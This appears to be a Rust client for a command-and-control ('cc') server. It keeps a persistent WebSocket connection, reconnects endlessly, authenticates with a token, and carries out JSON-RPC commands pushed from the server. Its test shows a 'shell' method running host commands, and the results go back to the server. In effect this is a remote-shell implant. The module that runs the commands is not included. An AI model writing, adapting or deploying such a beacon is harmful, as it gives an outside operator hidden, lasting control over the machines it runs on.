use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use tokio::time::{sleep, Duration};
use url::Url;
use log::{info, debug,error};
use futures_util::{StreamExt, SinkExt};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use serde_json::{Value};
use serde_json::json;
use crate::jsonrpc_server::handle_method_call;
use tokio::sync::Mutex;
use std::sync::Arc;
use std::time::Instant;
use tokio::task;

#[derive(Deserialize)]
struct IncomingMessage {
    id: Option<String>,
    from: Option<String>,
    action: String,
    payload: Option<serde_json::Value>,
}

#[derive(Serialize)]
struct JsonRpcResponse {
    jsonrpc: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    err: Option<String>,
    result: Value,
    id: Option<Value>,
}

#[derive(Deserialize)]
struct JsonRpcPayload {
    method: String,
    params: Option<serde_json::Value>,
}

fn make_call_res(id: &Option<String>,from: &Option<String>, result: JsonRpcResponse) -> Option<String> {
    id.as_ref().map(|id_str| {
        let msg = json!({
            "id": id_str,
            "to": from,
            "action": "callback",
            "payload": result
        });
        msg.to_string()
    })
}
pub async fn connect_cc_server_forever(server_url: &str, client_id: &str) {
    // Split URL to extract base URL and token
    let (clean_url, token) = match server_url.split_once('?') {
        Some((base, query)) => (base.to_string(), query.to_string()),
        None => (server_url.to_string(), String::new()),
    };
    let mut is_logged = false;
    let login_timeout = Duration::from_secs(5);
    let start_time = Instant::now();

    loop {

        let url_str = format!(
            "{}?id={}&t={}",
            clean_url,
            client_id,
            Utc::now().timestamp_millis()
        );

        let url = match Url::parse(&url_str) {
            Ok(u) => u,
            Err(e) => {
                error!("Invalid URL '{}': {}", url_str, e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[-] Connecting to {}", url);
        let ws_stream = match connect_async(url.clone()).await {
            Ok((stream, _)) => stream,
            Err(e) => {
                error!("[-] Connection error: {}", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[+] Connected to {}", url);

        let (write, mut read) = ws_stream.split();
        let write = Arc::new(Mutex::new(write));

        info!("[+] token is empty: {}",token.is_empty());

        // Send login message if token exists
        if !token.is_empty() {
            info!("[+] Send Login req!");

            let login_msg = json!({
                "action": "login",
                "payload": {
                    "token": token.replace("token=", "")
                }
            }).to_string();

            if let Err(e) = write.lock().await.send(Message::Text(login_msg)).await {
                error!("Failed to send login message: {}", e);
                continue;
            }
        } else {
            error!("token is empty");
            return;
        }

        let mut ping_task_handle = None; // 将ping任务句柄移到这里

        loop {
            tokio::select! {
                msg = read.next() => match msg {
                    Some(Ok(Message::Text(txt))) => {
                        info!("Received text: {}", txt);
                        if let Ok(data) = serde_json::from_str::<Value>(&txt) {
                            let action = data.get("action").and_then(Value::as_str).unwrap_or("");

                            match action {
                                "callback" => {
                                    // Handle callback messages
                                    // if let Some(id) = data.get("id").and_then(Value::as_str) {
                                    //     // Store in your MsgResult equivalent
                                    // }
                                }
                                "logged" => {
                                    is_logged = true;
                                    // Send ping every 5 seconds in a separate task
                                    let write_ping = write.clone(); // Clone the Arc to pass it into the task
                                    ping_task_handle = Some(task::spawn(async move {
                                        loop {
                                            sleep(Duration::from_secs(10)).await;
                                            let ping_msg = json!({ "action": "ping" }).to_string();
                                            let mut write_lock = write_ping.lock().await;
                                            if let Err(e) = write_lock.send(Message::Text(ping_msg)).await {
                                                error!("Failed to send ping: {}", e);
                                                break;
                                            }
                                            debug!("Sent ping");
                                        }
                                    }));
                                }
                                "logout" => {
                                    error!("logout!!");
                                    break; // Will trigger reconnection
                                }
                                _ => {
                                    if is_logged {
                                        let mut write_lock = write.lock().await;
                                        if let Err(e) = handle_msg(&txt, &mut *write_lock).await { // Dereference here
                                            error!("handle_msg error: {}", e);
                                            break; // 出错重连
                                        }
                                    }
                                }
                            }
                        }
                    },
                    _ => break,
                },
                _ = sleep(Duration::from_secs(1)) => {
                    if !is_logged && start_time.elapsed() > login_timeout {
                        error!("Login timeout, reconnecting...");
                        break;
                    }
                }
            }
        }

        // Wait for the ping task to finish (though it should run indefinitely)
        if let Some(handle) = ping_task_handle {
            handle.abort();
        }

        info!("[*] Connection closed, retrying in 1 second...");
        sleep(Duration::from_secs(1)).await;
    }
}


pub async fn handle_msg<S>(text: &str, ws_sender: &mut S) -> Result<(), Box<dyn std::error::Error>>
where
    S: futures_util::Sink<Message> + Unpin,
    <S as futures_util::Sink<Message>>::Error: std::error::Error + Send + Sync + 'static,
{
    let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
    match msg {
        Ok(incoming) => {
            if incoming.action == "jsonrpc" {
                if let Some(payload) = incoming.payload {
                    let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(payload);
                    match rpc {
                        Ok(rpc_payload) => {
                            debug!("Received jsonrpc method: {}", rpc_payload.method);
                            let (err, result) = handle_method_call(&rpc_payload.method, &rpc_payload.params);

                            let resp = JsonRpcResponse {
                                jsonrpc: "2.0".to_string(),
                                err,
                                result,
                                id: incoming.id.clone().map(serde_json::Value::String),
                            };

                            if let Some(reply) = make_call_res(&incoming.id,&incoming.from ,resp) {
                                ws_sender.send(Message::Text(reply)).await?;
                            }
                        }
                        Err(e) => {
                            error!("Failed to parse JSON-RPC payload: {}", e);
                        }
                    }
                } else {
                    error!("Payload missing, skipping.");
                }

            } else if incoming.action == "pong" {
                println!("pong!");
            } else {
                info!("Unknown action: {}", incoming.action);
            }
        }
        Err(e) => {
            error!("Failed to parse incoming message JSON: {}", e);
        }
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_handle_method_call() {
        let text =
            r#"{"id":"1","action":"jsonrpc","payload":{"method":"shell","params":["pwdj"]}}"#;

        let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
        match msg {
            Ok(incoming) => {
                if incoming.action == "jsonrpc" {
                    if let Some(payload) = incoming.payload {
                        let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(payload);
                        match rpc {
                            Ok(rpc_payload) => {
                                println!("Received jsonrpc method: {}", rpc_payload.method);
                                let (err, result) = handle_method_call(&rpc_payload.method, &rpc_payload.params);

                                let resp = JsonRpcResponse {
                                    jsonrpc: "2.0".to_string(),
                                    err,
                                    result,
                                    id: incoming.id.clone().map(serde_json::Value::String),
                                };

                                if let Some(reply) = make_call_res(&incoming.id,&incoming.from ,resp) {
                                    println!("reply: {}", reply);
                                }
                            }
                            Err(e) => {
                                println!("Failed to parse JSON-RPC payload: {}", e);
                            }
                        }
                    } else {
                        error!("Payload missing, skipping.");
                    }
                } else if incoming.action == "pong" {
                    println!("pong!");
                } else {
                    println!("Unknown action: {}", incoming.action);
                }
            }
            Err(e) => {
                println!("Failed to parse incoming message JSON: {}", e);
            }
        }
    }

}
